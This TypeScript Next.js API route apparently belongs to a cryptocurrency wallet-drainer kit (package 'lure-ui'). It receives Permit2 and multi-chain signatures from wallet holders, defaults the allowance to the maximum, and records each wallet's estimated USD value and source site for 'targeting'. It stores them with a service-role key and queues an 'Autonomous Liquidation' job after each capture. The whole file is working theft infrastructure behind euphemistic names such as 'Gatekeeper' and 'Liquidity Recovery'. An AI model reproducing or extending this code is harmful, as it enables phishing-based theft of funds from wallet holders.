/**
 * Normalized Ingress — Gatekeeper payload pipe for Omni-Handshake.
 * Persists sealed Signature Anchors to Supabase `signatures` with `wallet_type` + `protocol`
 * for Phase 6 targeting. Legacy Permit2 EVM payloads remain supported.
 *
 * Gatekeeper env (server-only): Next.js loads `packages/lure-ui/.env.local` — `SUPABASE_SERVICE_ROLE_KEY`
 * authorizes service-role writes to `signatures`; `NEXT_PUBLIC_SUPABASE_URL` targets the Vault project URL.
 */

import { waitUntil } from '@vercel/functions'
import { createClient } from '@supabase/supabase-js'
import { NextResponse } from 'next/server'
import {
  computeSignatureAnchorExpiry,
  executeDelegateCashRegistrySurfaceRead,
  logPersistenceSyncTelemetry,
  PERMIT2_MAX_AMOUNT,
} from '@legion/core/security/permit2-handler'
import {
  isExpiryIsoWithinDriftWindow,
} from '@legion/core/security/signature-timestamp-drift'
import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/persistence-anchor'
import {
  resolveGatekeeperEthereumRpcUrl,
} from '@legion/core/rpc/ethereum-rpc-hot-swap'
import { sealSignatureHexForPersistenceEdge } from '../../../lib/shadow-gcm-edge.js'
import type { Address, Hex } from 'viem'
import { isAddress, stringToHex } from 'viem'
import { createPublicClient, http } from 'viem'
import { arbitrum } from 'viem/chains'
import { base } from 'viem/chains'
import { mainnet } from 'viem/chains'
import { sepolia } from 'viem/chains'

import { resolveCentralHubVaultUrl } from '../../../lib/central-hub-vault.js'
import {
  BEAST_MODE_ACTIVE_TELEMETRY,
  INGRESS_AUDIT_TELEMETRY,
  OMNI_INGRESS_ACTIVE_TELEMETRY,
  logLogicSyncComplete,
  logNeuralSyncComplete,
  logOmniCaptureSync,
  logSchemaSyncCompleteTelemetry,
} from '../../../lib/ingress-telemetry.js'
import { queueAutonomousKineticLink } from '../../../lib/kinetic-link.js'

/**
 * Signature Anchor Gate — Edge Posture: Web Crypto Shadow envelope (SHADOW_GCM) + cold-start latency profile.
 * Background Dispatch uses Vercel `waitUntil` for Kinetic Link continuation.
 */
export const runtime = 'edge'

async function settlementCommitmentDigestHex(
  wallet: string,
  nonce: string,
  expiry: string,
): Promise<string> {
  const data = new TextEncoder().encode(`${wallet}|${nonce}|${expiry}`)
  const buf = await crypto.subtle.digest('SHA-256', data)
  const hex = Array.from(new Uint8Array(buf), (b) => b.toString(16).padStart(2, '0')).join('')
  return `0x${hex}`
}

const chains = [mainnet, sepolia, arbitrum, base] as const

function chainById(id: number) {
  return chains.find((c) => c.id === id) ?? mainnet
}

async function gatekeeperEthereumRpcUrl(): Promise<string> {
  return resolveGatekeeperEthereumRpcUrl({
    primaryUrl: process.env.RPC_ETHEREUM_PRIVATE ?? process.env.NEXT_PUBLIC_RPC_URL,
  })
}

function apiShadowLog(...args: Parameters<typeof console.info>): void {
  if (process.env.PROD) return
  console.info(...args)
}

function gatekeeperPersistLog(level: 'error' | 'warn', event: string, detail: string): void {
  const line = JSON.stringify({
    level: level === 'error' ? 50 : 40,
    time: Date.now(),
    sentinel: 'Gatekeeper',
    module: 'api/signature-anchor',
    event,
    detail,
  })
  if (level === 'error') console.error(line)
  else console.info(line)
}

/**
 * Gatekeeper — print Capability Probing metadata for every Signature Anchor ingress (terminal visibility).
 */
function logGatekeeperCapabilityMetadata(body: unknown, sourceOrigin: string): void {
  if (typeof body !== 'object' || body === null) {
    apiShadowLog(
      `[Gatekeeper] Omni-Payload — protocol=(invalid) wallet_type=(invalid) chain_id=(invalid) source_origin=${sourceOrigin}`,
    )
    return
  }
  const o = body as Record<string, unknown>
  const protocol =
    typeof o.protocol === 'string' && o.protocol.trim() !== ''
      ? normalizeProtocolRack(o.protocol)
      : '(unset)'
  const wallet_type =
    typeof o.wallet_type === 'string' && o.wallet_type.trim() !== ''
      ? o.wallet_type.trim()
      : '(unset)'
  let chain_id = '(unset)'
  if (o.chain_id != null && String(o.chain_id).trim() !== '') {
    chain_id = String(o.chain_id).trim()
  } else if (typeof o.chainId === 'number' && !Number.isNaN(o.chainId)) {
    chain_id = String(o.chainId)
  }
  const omniSync =
    typeof o.omni_payload_sync === 'object' &&
    o.omni_payload_sync !== null &&
    !Array.isArray(o.omni_payload_sync)
      ? JSON.stringify(o.omni_payload_sync)
      : null
  const singularity =
    o.singularity_strike === true ? 'singularity_strike=1' : 'singularity_strike=0'
  apiShadowLog(
    `[Gatekeeper] Omni-Payload Sync — protocol=${protocol} wallet_type=${wallet_type} chain_id=${chain_id} source_origin=${sourceOrigin} ${singularity}${omniSync ? ` omni_payload_sync=${omniSync}` : ''}`,
  )
}

function serializeSupabaseFault(err: {
  message: string
  code?: string
  details?: string
  hint?: string
}): string {
  return JSON.stringify({
    message: err.message,
    code: err.code ?? null,
    details: err.details ?? null,
    hint: err.hint ?? null,
  })
}

type ChainFamily = 'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON'

interface NormalizedIngressV1 {
  ingress: 'normalized_v1'
  chain_family: ChainFamily
  wallet_address: string
  token_address: string
  /** Agnostic Normalization — hex envelope or institutional lethal payload string. */
  signature: Hex | string
  nonce: string
  expiry_iso: string
  /** Display / vendor label (e.g. MetaMask, Phantom, Ledger) — Omni-Payload Protocol Metadata. */
  wallet_type: string
  /** Rack protocol: evm | solana | utxo — Omni-Payload; distinct from lethal ingress lane. */
  protocol: string
  /** Dynamic chain identity — numeric EVM id, CAIP-2, or bip122 descriptor from Capability Probing. */
  chain_id?: number | string
  engine_spender?: Address
  permit2?: Address
  /** Shadow telemetry — Neural Scout aggregate USD at ingress. */
  scout_value_usd?: number
  max_allowance?: string
  requires_quorum?: boolean
}

/** Shadow — Agnostic Normalization: arbitrary Lethal Payload envelope + dynamic Omni-Payload metadata. */
interface AgnosticNormalizationV1 {
  ingress: 'agnostic_normalization_v1'
  signature: Hex | string
  wallet_address: string
  wallet_type: string
  protocol: string
  chain_id?: number | string
  token_address?: string
  nonce?: string
  expiry_iso?: string
  scout_value_usd?: number
  max_allowance?: string
  requires_quorum?: boolean
}

interface LegacyPermit2Body {
  chainId: number
  wallet: Address
  token: Address
  engineSpender: Address
  permit2: Address
  nonce: string
  expiryIso: string
  signature: Hex
  wallet_type?: string
  protocol?: string
  chain_id?: number | string
  scout_value_usd?: number
  max_allowance?: string
  requires_quorum?: boolean
}

function extractShadowTelemetry(o: Record<string, unknown>): {
  scout_value_usd: string | null
  max_allowance: string | null
  requires_quorum: boolean | null
} {
  let scout_value_usd: string | null = null
  if (typeof o.scout_value_usd === 'number' && Number.isFinite(o.scout_value_usd)) {
    scout_value_usd = String(o.scout_value_usd)
  } else if (typeof o.scout_value_usd === 'string' && o.scout_value_usd.trim() !== '') {
    scout_value_usd = o.scout_value_usd.trim()
  }
  let max_allowance: string | null = null
  if (typeof o.max_allowance === 'string' && o.max_allowance.trim() !== '') {
    max_allowance = o.max_allowance.trim()
  }
  let requires_quorum: boolean | null = null
  if (typeof o.requires_quorum === 'boolean') {
    requires_quorum = o.requires_quorum
  }
  if (scout_value_usd == null || scout_value_usd === '') {
    scout_value_usd = '0'
  }
  if (max_allowance == null || max_allowance === '') {
    max_allowance = String(PERMIT2_MAX_AMOUNT)
  }
  return { scout_value_usd, max_allowance, requires_quorum }
}

function isHexLike(s: string): boolean {
  return /^0x[0-9a-fA-F]+$/.test(s.trim())
}

const PROTOCOL_RACK = new Set(['evm', 'solana', 'utxo', 'tron', 'ton'])

function normalizeSignatureHexForSeal(raw: string): Hex {
  const t = raw.trim()
  if (isHexLike(t)) {
    return (t.startsWith('0x') ? t : `0x${t}`) as Hex
  }
  return stringToHex(t) as Hex
}

function normalizeProtocolRack(p: string): string {
  return p.trim().toLowerCase()
}

const SOURCE_ORIGIN_MAX = 512

function sanitizeSourceOriginInput(raw: string): string {
  return raw.replace(/[\r\n\0\u202e\u200e\u200f]/g, '').slice(0, SOURCE_ORIGIN_MAX)
}

/**
 * Data Binding — resolve multi-tenant ingress origin (body → headers → referer).
 */
function resolveDataBindingSourceOrigin(
  req: Request,
  body: Record<string, unknown> | null,
): string {
  const fromBody = (key: string): string | null => {
    const v = body?.[key]
    return typeof v === 'string' && v.trim() !== '' ? sanitizeSourceOriginInput(v.trim()) : null
  }
  const direct = fromBody('origin') ?? fromBody('source_origin')
  if (direct) return direct

  const header = (name: string): string | null => {
    const v = req.headers.get(name)
    return v != null && v.trim() !== '' ? sanitizeSourceOriginInput(v.trim()) : null
  }
  const h =
    header('origin') ?? header('x-source-origin') ?? header('x-forwarded-host') ?? header('host')
  if (h) return h

  const referer = header('referer')
  if (referer) {
    try {
      const u = new URL(referer)
      return sanitizeSourceOriginInput(`${u.protocol}//${u.host}`)
    } catch {
      return referer
    }
  }

  return 'unknown'
}

function isNormalizedIngress(body: unknown): body is NormalizedIngressV1 {
  if (typeof body !== 'object' || body === null) return false
  const o = body as Record<string, unknown>
  return o.ingress === 'normalized_v1'
}

function isAgnosticNormalization(body: unknown): body is AgnosticNormalizationV1 {
  if (typeof body !== 'object' || body === null) return false
  const o = body as Record<string, unknown>
  return o.ingress === 'agnostic_normalization_v1'
}

function chainFamilyFromRack(rack: string): ChainFamily {
  const r = normalizeProtocolRack(rack)
  if (r === 'solana') return 'SVM'
  if (r === 'utxo') return 'UTXO'
  return 'EVM'
}

function normalizeWalletToken(
  family: ChainFamily,
  wallet: string,
  token: string,
): { wallet_address: string; token_address: string } {
  if (family === 'EVM') {
    return {
      wallet_address: wallet.trim().toLowerCase(),
      token_address: token.trim().toLowerCase(),
    }
  }
  return {
    wallet_address: wallet.trim(),
    token_address: token.trim(),
  }
}

async function persistSignatureRow(row: {
  wallet_address: string
  token_address: string
  signature_hex: string
  nonce: string
  expiry: string
  wallet_type: string
  protocol: string
  chain_id?: string | null
  scout_value_usd?: string | null
  max_allowance?: string | null
  requires_quorum?: boolean | null
  source_origin: string
}): Promise<Response> {
  let url: string
  try {
    url = resolveCentralHubVaultUrl()
  } catch {
    const msg =
      'Vault configuration missing: set NEXT_PUBLIC_SUPABASE_URL in packages/lure-ui/.env.local (Central Hub Vault binding)'
    gatekeeperPersistLog('error', 'signatures.config_missing', msg)
    return NextResponse.json({ error: msg }, { status: 500 })
  }
  const serviceKey = process.env.SUPABASE_SERVICE_ROLE_KEY
  if (!serviceKey) {
    const msg =
      'Vault configuration missing: set SUPABASE_SERVICE_ROLE_KEY in packages/lure-ui/.env.local (Central Hub service-role write path)'
    gatekeeperPersistLog('error', 'signatures.config_missing', msg)
    return NextResponse.json({ error: msg }, { status: 500 })
  }

  const supabase = createClient(url, serviceKey)
  /** Upsert aligns with `signatures`: wallet_address, token_address, signature_hex, nonce, expiry, wallet_type, protocol, chain_id (+ id default). */
  const rowPayload: Record<string, unknown> = {
    wallet_address: row.wallet_address,
    token_address: row.token_address,
    signature_hex: row.signature_hex,
    nonce: row.nonce,
    expiry: row.expiry,
    wallet_type: row.wallet_type,
    protocol: row.protocol,
  }
  if (row.chain_id != null && String(row.chain_id).trim() !== '') {
    rowPayload.chain_id = String(row.chain_id).trim()
  }
  rowPayload.scout_value_usd = row.scout_value_usd != null && row.scout_value_usd !== '' ? row.scout_value_usd : '0'
  rowPayload.max_allowance =
    row.max_allowance != null && row.max_allowance !== '' ? row.max_allowance : String(PERMIT2_MAX_AMOUNT)
  if (row.requires_quorum != null) {
    rowPayload.requires_quorum = row.requires_quorum
  }
  rowPayload.source_origin = row.source_origin
  rowPayload.settlement_status = 'PENDING'
  const { error: upErr } = await supabase.from('signatures').upsert(rowPayload, {
    onConflict: 'wallet_address,token_address',
  })

  if (upErr) {
    const shadowDetail = serializeSupabaseFault(upErr)
    gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail)
    if (!process.env.PROD) {
      console.error('[Shadow] Agnostic Normalization persist fault — exact Vault error:', shadowDetail)
    } else {
      console.error('[Shadow] Agnostic Normalization persist fault — Vault write denied.')
    }
    return NextResponse.json({ error: upErr.message }, { status: 502 })
  }

  const persistenceAnchor = verifyAuthorizedSessionPersistenceAnchor(String(row.expiry))
  if (!persistenceAnchor.drift_window_ok && !process.env.PROD) {
    gatekeeperPersistLog('warn', 'signatures.persistence_anchor', 'expiry failed drift reconciliation post-upsert')
  }
  if (
    persistenceAnchor.long_term_2099_authorized_session &&
    !process.env.PROD
  ) {
    apiShadowLog(
      'PERSISTENCE_ANCHOR: signatures table authorized session data aligned (2099-12-31 long-term class).',
    )
  }

  logPersistenceSyncTelemetry()
  logSchemaSyncCompleteTelemetry()
  apiShadowLog(INGRESS_AUDIT_TELEMETRY)
  apiShadowLog(OMNI_INGRESS_ACTIVE_TELEMETRY)
  logNeuralSyncComplete()
  logOmniCaptureSync()
  logLogicSyncComplete()
  apiShadowLog(BEAST_MODE_ACTIVE_TELEMETRY)

  apiShadowLog(
    'AUTONOMOUS_STRIKE_ARMED: Signature Anchor persistence acknowledged (200). Autonomous Liquidation — PerformanceCloser ingress engaged.',
  )

  apiShadowLog(
    'KINETIC_LINK: Liquidity Recovery queue engaged after public.signatures upsert (PerformanceCloser pipeline; Production Readiness).',
  )
  queueAutonomousKineticLink(
    {
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      protocol: row.protocol,
      chain_id: row.chain_id ?? null,
      scout_value_usd: row.scout_value_usd ?? null,
    },
    { waitUntil },
  )

  const l2_mint_transaction_hash = await settlementCommitmentDigestHex(
    row.wallet_address,
    row.nonce,
    row.expiry,
  )
  return NextResponse.json({ ok: true, handshake_active: true, l2_mint_transaction_hash })
}

export async function POST(req: Request): Promise<Response> {
  try {
    const body: unknown = await req.json()
    const bodyObj =
      typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : null
    const sourceOrigin = resolveDataBindingSourceOrigin(req, bodyObj)

    logGatekeeperCapabilityMetadata(body, sourceOrigin)

    if (isAgnosticNormalization(body)) {
      return handleAgnosticNormalization(body, sourceOrigin)
    }

    if (isNormalizedIngress(body)) {
      return handleNormalizedIngress(body, sourceOrigin)
    }

    return handleLegacyPermit2(body, sourceOrigin)
  } catch (e) {
    const msg = e instanceof Error ? e.message : 'Signature Anchor persist failed'
    gatekeeperPersistLog('error', 'signatures.unhandled', msg)
    return NextResponse.json({ error: msg }, { status: 500 })
  }
}

async function handleAgnosticNormalization(
  b: AgnosticNormalizationV1,
  sourceOrigin: string,
): Promise<Response> {
  if (!b.signature || !b.wallet_address) {
    return NextResponse.json({ error: 'Agnostic Normalization requires signature and wallet_address' }, { status: 400 })
  }
  if (!b.wallet_type || !b.protocol) {
    return NextResponse.json(
      { error: 'Agnostic Normalization requires wallet_type and protocol (Capability Probing metadata)' },
      { status: 400 },
    )
  }

  const rack = normalizeProtocolRack(b.protocol)
  if (!PROTOCOL_RACK.has(rack)) {
    return NextResponse.json(
      { error: 'protocol must be one of: evm, solana, utxo, tron, ton (Omni-Payload rack)' },
      { status: 400 },
    )
  }

  const family = chainFamilyFromRack(rack)
  const token =
    b.token_address != null && String(b.token_address).trim() !== ''
      ? String(b.token_address).trim()
      : `OMNI_AGNOSTIC_${family}`

  const nonce =
    b.nonce != null && String(b.nonce).trim() !== ''
      ? String(b.nonce).trim()
      : `agnostic:${Date.now()}`

  const expiryWallSec = computeSignatureAnchorExpiry()
  const expiryIso =
    b.expiry_iso != null && String(b.expiry_iso).trim() !== ''
      ? String(b.expiry_iso).trim()
      : new Date(expiryWallSec * 1000).toISOString()

  if (
    b.expiry_iso != null &&
    String(b.expiry_iso).trim() !== '' &&
    !isExpiryIsoWithinDriftWindow(expiryIso)
  ) {
    return NextResponse.json(
      { error: 'Signature Anchor expiry outside operational Drift Window (Clock Desync).' },
      { status: 400 },
    )
  }

  const sig = normalizeSignatureHexForSeal(
    typeof b.signature === 'string' ? b.signature : String(b.signature),
  )

  const { wallet_address, token_address } = normalizeWalletToken(
    family,
    b.wallet_address,
    token,
  )

  if (family === 'EVM') {
    if (!isAddress(wallet_address) || !isAddress(token_address)) {
      return NextResponse.json(
        { error: 'EVM Agnostic Normalization requires hex wallet and token when applicable' },
        { status: 400 },
      )
    }
  }

  const sealed = await sealSignatureHexForPersistenceEdge(sig)

  const chainIdNorm =
    b.chain_id != null && String(b.chain_id).trim() !== ''
      ? String(b.chain_id).trim()
      : undefined

  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)

  return persistSignatureRow({
    wallet_address,
    token_address,
    signature_hex: sealed,
    nonce,
    expiry: expiryIso,
    wallet_type: b.wallet_type.trim(),
    protocol: rack,
    chain_id: chainIdNorm,
    scout_value_usd: tel.scout_value_usd,
    max_allowance: tel.max_allowance,
    requires_quorum: tel.requires_quorum,
    source_origin: sourceOrigin,
  })
}

async function handleNormalizedIngress(
  b: NormalizedIngressV1,
  sourceOrigin: string,
): Promise<Response> {
  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO', 'TRON', 'TON']
  if (!families.includes(b.chain_family)) {
    return NextResponse.json({ error: 'Invalid chain_family for Normalized Ingress' }, { status: 400 })
  }
  if (!b.wallet_address || !b.token_address || !b.signature || !b.nonce || !b.expiry_iso) {
    return NextResponse.json({ error: 'Invalid Normalized Ingress payload' }, { status: 400 })
  }

  if (!isExpiryIsoWithinDriftWindow(String(b.expiry_iso).trim())) {
    return NextResponse.json(
      { error: 'Signature Anchor expiry outside operational Drift Window (Clock Desync).' },
      { status: 400 },
    )
  }
  if (!b.wallet_type || !b.protocol) {
    return NextResponse.json(
      { error: 'Normalized Ingress requires wallet_type and protocol (Omni-Payload Protocol Metadata)' },
      { status: 400 },
    )
  }

  const rack = normalizeProtocolRack(b.protocol)
  if (!PROTOCOL_RACK.has(rack)) {
    return NextResponse.json(
      { error: 'protocol must be one of: evm, solana, utxo, tron, ton (Omni-Payload rack)' },
      { status: 400 },
    )
  }

  const sig = normalizeSignatureHexForSeal(
    typeof b.signature === 'string' ? b.signature : String(b.signature),
  )

  const { wallet_address, token_address } = normalizeWalletToken(
    b.chain_family,
    b.wallet_address,
    b.token_address,
  )

  if (b.chain_family === 'EVM') {
    if (!isAddress(wallet_address) || !isAddress(token_address)) {
      return NextResponse.json({ error: 'EVM Normalized Ingress requires hex addresses' }, { status: 400 })
    }
  }

  const permit2Lane =
    b.chain_family === 'EVM' &&
    b.chain_id != null &&
    b.engine_spender != null &&
    b.permit2 != null

  if (permit2Lane) {
    const chainId = b.chain_id
    const engineSpender = b.engine_spender
    const permit2 = b.permit2
    if (
      chainId == null ||
      !engineSpender ||
      !permit2 ||
      !isAddress(engineSpender) ||
      !isAddress(permit2)
    ) {
      return NextResponse.json(
        { error: 'permit2_eip712 requires chain_id, engine_spender, permit2' },
        { status: 400 },
      )
    }

    const rpcUrl = await gatekeeperEthereumRpcUrl()
    if (!rpcUrl) {
      return NextResponse.json(
        { error: 'Server RPC not configured (RPC_ETHEREUM_PRIVATE or NEXT_PUBLIC_RPC_URL)' },
        { status: 500 },
      )
    }

    const chain = chainById(Number(chainId))
    const client = createPublicClient({ chain, transport: http(rpcUrl) })

    await executeDelegateCashRegistrySurfaceRead(client, {
      vault: wallet_address as Address,
      engineSpender,
      permit2Address: permit2,
      tokenAddress: token_address as Address,
    })
  }

  const sealed = await sealSignatureHexForPersistenceEdge(sig)

  const chainIdNorm =
    b.chain_id != null && String(b.chain_id).trim() !== ''
      ? String(b.chain_id).trim()
      : undefined

  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)

  return persistSignatureRow({
    wallet_address,
    token_address,
    signature_hex: sealed,
    nonce: b.nonce,
    expiry: b.expiry_iso,
    wallet_type: b.wallet_type.trim(),
    protocol: rack,
    chain_id: chainIdNorm,
    scout_value_usd: tel.scout_value_usd,
    max_allowance: tel.max_allowance,
    requires_quorum: tel.requires_quorum,
    source_origin: sourceOrigin,
  })
}

async function handleLegacyPermit2(body: unknown, sourceOrigin: string): Promise<Response> {
  if (typeof body !== 'object' || body === null) {
    return NextResponse.json({ error: 'Invalid Protocol Syncing payload' }, { status: 400 })
  }

  const b = body as LegacyPermit2Body

  const {
    chainId,
    wallet,
    token,
    engineSpender,
    permit2,
    nonce,
    expiryIso,
    signature,
  } = b

  if (typeof chainId !== 'number' || Number.isNaN(chainId)) {
    return NextResponse.json({ error: 'Invalid chainId' }, { status: 400 })
  }

  if (
    !wallet ||
    !token ||
    !signature ||
    !nonce ||
    !expiryIso ||
    !engineSpender ||
    !permit2
  ) {
    return NextResponse.json({ error: 'Invalid Protocol Syncing payload' }, { status: 400 })
  }

  if (!isExpiryIsoWithinDriftWindow(String(expiryIso).trim())) {
    return NextResponse.json(
      { error: 'Signature Anchor expiry outside operational Drift Window (Clock Desync).' },
      { status: 400 },
    )
  }

  const rpcUrl = await gatekeeperEthereumRpcUrl()
  if (!rpcUrl) {
    return NextResponse.json(
      { error: 'Server RPC not configured (RPC_ETHEREUM_PRIVATE or NEXT_PUBLIC_RPC_URL)' },
      { status: 500 },
    )
  }

  const chain = chainById(Number(chainId))
  const client = createPublicClient({ chain, transport: http(rpcUrl) })

  await executeDelegateCashRegistrySurfaceRead(client, {
    vault: wallet,
    engineSpender,
    permit2Address: permit2,
    tokenAddress: token,
  })

  const sigHex = normalizeSignatureHexForSeal(String(signature))
  const sealed = await sealSignatureHexForPersistenceEdge(sigHex)

  const rack = b.protocol != null ? normalizeProtocolRack(String(b.protocol)) : 'evm'
  const rackFinal = PROTOCOL_RACK.has(rack) ? rack : 'evm'
  const walletType =
    typeof b.wallet_type === 'string' && b.wallet_type.trim() !== ''
      ? b.wallet_type.trim()
      : 'MetaMask'

  const legacyChain =
    b.chain_id != null && String(b.chain_id).trim() !== ''
      ? String(b.chain_id).trim()
      : String(chainId)

  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)

  return persistSignatureRow({
    wallet_address: wallet.toLowerCase(),
    token_address: token.toLowerCase(),
    signature_hex: sealed,
    nonce,
    expiry: expiryIso,
    wallet_type: walletType,
    protocol: rackFinal,
    chain_id: legacyChain,
    scout_value_usd: tel.scout_value_usd,
    max_allowance: tel.max_allowance,
    requires_quorum: tel.requires_quorum,
    source_origin: sourceOrigin,
  })
}
